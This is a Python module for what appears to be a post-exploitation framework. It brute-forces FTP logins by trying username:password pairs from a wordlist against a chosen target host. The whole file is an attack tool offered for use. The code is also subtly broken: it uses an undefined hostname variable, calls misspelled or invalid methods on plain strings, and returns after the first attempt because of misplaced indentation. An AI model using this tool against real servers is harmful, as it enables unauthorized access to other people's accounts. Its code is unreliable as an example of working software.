MODULE_TYPE = "postexploit"
import zipfile
import ftplib
import time
from threading import Thread
from collections import OrderedDict
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Ftp Password Bruter Lite',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'Bruteforces ftp Services passwords given a wordlistFile',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
                ('RHOST', ('', True, 'FTP SERVER IP')),
                ('WORDLIST', ('/usr/share/wordlists/rockyou.txt', True, 'Wordlist path'))
                ])
                }
    def help(self):
    	print("Usage: set RHOST 192.168.95.179 | set WORDLIST <path/to/file> then run")
    	nwuserName = ""
    	nwpassWord = ""
    def bruteLogin(self,rhost, wordlist):
    	pF = open(wordlist, 'r')
    	for line in pF.readlines():
    		userName = line.split(':')[0]
    		passWord = line.split(':')[1].strip('\r').strip('\n')
    		print ("[+] Trying: "+userName+"/"+passWord)
    		try:
    			ftp = ftplib.FTP(rhost)
    			ftp.login(userName, passWord)
    			print ('\n[*] ' + str(hostname) +\
   ' FTP Logon Succeeded: '+userName+"/"+passWord)
    			nwuserName.inert(userName)
    			nwpassWord.insert(passWord)
    			ftp.quit()
    			return (userName, passWord)
    		except Exception as e:
    			pass
    			print(str(e))
    		print ('\n[-] Could not brute force FTP credentials.')
    		return (None, None)
   
    def execute(self):
        rhost = self.info['Options']['RHOST'][0]
        wordlist = self.info['Options']['WORDLIST'][0]
        self.bruteLogin(rhost, wordlist)
        return "[+] Bruteforcing ftp password ..."
    